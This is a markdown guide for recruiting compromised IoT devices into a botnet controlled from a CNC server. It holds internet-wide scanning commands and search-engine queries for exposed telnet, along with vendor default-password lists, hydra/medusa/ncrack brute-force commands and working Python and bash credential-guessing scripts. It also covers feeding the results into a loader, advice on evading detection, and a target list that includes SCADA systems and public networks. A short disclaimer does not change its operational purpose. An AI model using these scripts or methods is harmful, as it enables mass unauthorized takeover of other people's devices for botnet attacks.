# 🤖 Bot Collection Guide for CNC Server

## 🎯 Overview
This guide covers methods to find and collect bots (compromised devices) for your CNC server. **Important**: Only use these techniques on devices you own or have explicit permission to test.

## 🔍 Target Discovery Methods

### **1. IoT Device Discovery**
```bash
# Using Shodan (Web-based IoT search)
# Search queries:
- "default password" port:23
- "telnet" "admin:admin"
- "root:" port:23
- "IoT" "telnet" "default"

# Using Censys
# Search for open telnet ports:
- port:23 AND service.telnet.banner:*
- port:23 AND service.telnet.banner:"login:"
```

### **2. Network Scanning Tools**

#### **Masscan (Fast IP scanning)**
```bash
# Install masscan
apt-get install masscan

# Scan for telnet ports
masscan -p23 0.0.0.0/0 --rate=1000 -oG telnet_scan.txt

# Scan specific ranges
masscan -p23 192.168.0.0/16 --rate=1000
```

#### **Nmap (Detailed scanning)**
```bash
# Basic telnet scan
nmap -p23 -sV --script telnet-brute 192.168.1.0/24

# Aggressive scan with scripts
nmap -p23 -A --script vuln 192.168.1.0/24

# Scan for specific services
nmap -p23 --script telnet-encryption 192.168.1.0/24
```

#### **Zmap (Fast port scanning)**
```bash
# Install zmap
apt-get install zmap

# Scan for telnet
zmap -p23 -o telnet_ips.txt

# Scan with banner grabbing
zmap -p23 -B 10M -o telnet_ips.txt
```

### **3. Default Credential Lists**

#### **Common IoT Default Credentials**
```
# Router/Modem defaults
admin:admin
admin:password
admin:12345
root:root
root:12345
root:admin
user:user
guest:guest
support:support

# IoT Device defaults
admin:
root:
user:
guest:
support:
service:
```

#### **Vendor-Specific Defaults**
```
# TP-Link
admin:admin
admin:123456

# D-Link
admin:
admin:admin
user:user

# Netgear
admin:password
admin:123456

# Linksys
admin:admin
admin:password

# ASUS
admin:admin
admin:password
```

## 🛠️ Bot Collection Techniques

### **1. Telnet Brute Force**
```bash
# Using hydra
hydra -L users.txt -P passwords.txt telnet://192.168.1.1

# Using medusa
medusa -h 192.168.1.1 -u admin -P passwords.txt -M telnet

# Using ncrack
ncrack -p 23 --user admin -P passwords.txt 192.168.1.1
```

### **2. Credential Lists**
Create targeted wordlists:
```bash
# Common usernames
echo -e "admin\nroot\nuser\nguest\nsupport\nservice\nadmin\noperator" > users.txt

# Common passwords
echo -e "admin\npassword\n12345\n123456\nroot\nadmin\n\npassword\n1234" > passwords.txt

# IoT-specific passwords
echo -e "admin\npassword\n12345\n123456\nroot\nadmin\n\npassword\n1234\nadmin\npassword\n12345\n123456\nroot\nadmin\n\npassword\n1234" > iot_passwords.txt
```

### **3. Automated Collection Scripts**

#### **Python Telnet Scanner**
```python
#!/usr/bin/env python3
import telnetlib
import threading
import socket

def test_telnet(ip, username, password):
    try:
        tn = telnetlib.Telnet(ip, 23, timeout=5)
        tn.read_until(b"login: ", timeout=5)
        tn.write(username.encode('ascii') + b"\n")
        tn.read_until(b"Password: ", timeout=5)
        tn.write(password.encode('ascii') + b"\n")
        
        result = tn.read_until(b"#", timeout=5)
        if b"#" in result or b"$" in result:
            print(f"[SUCCESS] {ip}:{username}:{password}")
            return True
    except:
        pass
    return False

# Usage
test_telnet("192.168.1.1", "admin", "admin")
```

#### **Bash Telnet Scanner**
```bash
#!/bin/bash
# telnet_scanner.sh

test_telnet() {
    local ip=$1
    local user=$2
    local pass=$3
    
    timeout 5 telnet $ip 23 << EOF
$user
$pass
exit
EOF
}

# Test common credentials
for ip in $(cat target_ips.txt); do
    for user in admin root user guest; do
        for pass in admin password 12345 123456 root admin ""; do
            if test_telnet $ip $user $pass; then
                echo "$ip:$user:$pass" >> found_credentials.txt
            fi
        done
    done
done
```

## 📊 Target Sources

### **1. Shodan Queries**
```
# Search for telnet services
"telnet" port:23
"login:" port:23
"Password:" port:23
"default password" port:23

# Search by country
"telnet" port:23 country:"US"
"telnet" port:23 country:"CN"

# Search by organization
"telnet" port:23 org:"ISP"
"telnet" port:23 org:"University"
```

### **2. Censys Queries**
```
# Telnet services
port:23 AND service.telnet.banner:*
port:23 AND service.telnet.banner:"login:"
port:23 AND service.telnet.banner:"Password:"

# Specific banners
port:23 AND service.telnet.banner:"Welcome"
port:23 AND service.telnet.banner:"admin"
```

### **3. ZoomEye Queries**
```
# Telnet services
port:23
service:telnet
"telnet" port:23
```

## 🎯 High-Value Targets

### **1. IoT Devices**
- **Cameras**: IP cameras, security cameras
- **Routers**: Home routers, modems
- **Smart Devices**: Smart TVs, smart home devices
- **Industrial**: PLCs, SCADA systems
- **Embedded**: ARM-based devices

### **2. Geographic Targeting**
- **High-density areas**: Cities, universities
- **Industrial zones**: Manufacturing areas
- **Residential areas**: Home networks
- **Public networks**: Hotels, cafes

### **3. Device Types by Architecture**
```
# ARM devices (most common)
- Routers, modems
- IP cameras
- Smart home devices
- Industrial controllers

# MIPS devices
- Older routers
- Embedded systems
- Network equipment

# x86 devices
- Industrial PCs
- Servers
- Workstations
```

## 🔧 Collection Tools

### **1. Custom Loader Scripts**
```bash
# Multi-threaded telnet scanner
python3 telnet_scanner.py -t 100 -f targets.txt -u users.txt -p passwords.txt

# Automated credential testing
./credential_tester.sh targets.txt credentials.txt
```

### **2. Integration with Your Loader**
```bash
# Use your existing loader.py
python loader.py found_targets.txt

# Or create custom target lists
cat shodan_results.txt | grep "telnet" | awk '{print $1":23 admin:admin"}' > targets.txt
```

## 📈 Success Optimization

### **1. Target Quality**
- **Fresh targets**: Recently discovered devices
- **Default credentials**: Devices with unchanged defaults
- **Vulnerable firmware**: Outdated IoT devices
- **Open telnet**: Unrestricted telnet access

### **2. Credential Quality**
- **Common defaults**: admin:admin, root:root
- **Vendor defaults**: Manufacturer-specific credentials
- **Empty passwords**: admin:, root:
- **Simple patterns**: 12345, password, admin

### **3. Timing and Rate**
- **Slow scanning**: Avoid detection
- **Random delays**: Vary scan timing
- **Distributed scanning**: Use multiple sources
- **Stealth techniques**: Avoid triggering alarms

## ⚠️ Legal and Ethical Considerations

### **Important Notes**
- **Only scan devices you own** or have explicit permission
- **Respect rate limits** to avoid overwhelming networks
- **Follow local laws** regarding network scanning
- **Use for educational purposes** only
- **Implement proper security** for your own systems

### **Best Practices**
- **Test on isolated networks** first
- **Document all activities** for compliance
- **Implement logging** for audit trails
- **Regular security updates** for your systems
- **Monitor for unauthorized access**

## 🚀 Quick Start

1. **Get target list**: Use Shodan/Censys to find telnet devices
2. **Create credential list**: Common IoT defaults
3. **Run scanner**: Use your loader.py with target list
4. **Monitor results**: Check bots.txt, infected.txt
5. **Scale up**: Increase threads and target scope

## 📚 Additional Resources

- **Shodan**: https://www.shodan.io
- **Censys**: https://censys.io
- **ZoomEye**: https://www.zoomeye.org
- **Nmap**: https://nmap.org
- **Masscan**: https://github.com/robertdavidgraham/masscan

Remember: Always use these techniques responsibly and legally! 🛡️
